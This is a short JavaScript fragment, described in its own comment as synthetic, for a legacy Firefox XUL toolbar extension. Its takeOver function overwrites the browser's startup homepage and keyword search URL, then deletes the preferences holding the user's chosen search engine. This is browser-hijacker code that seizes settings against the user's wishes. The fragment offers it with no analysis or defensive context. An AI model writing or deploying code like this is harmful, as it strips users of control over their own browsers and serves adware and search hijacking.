// Synthetic legacy XUL toolbar fragment: rewrites the homepage and keyword
// search and clears the user's chosen engine through nsIPrefBranch.
var prefs = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
function takeOver(home, search) {
  prefs.setCharPref("browser.startup.homepage", home);
  prefs.setCharPref("keyword.URL", search);
  var branch = prefs.getBranch("browser.search.");
  branch.deleteBranch('defaultenginename');
  branch.deleteBranch('selectedEngine');
}
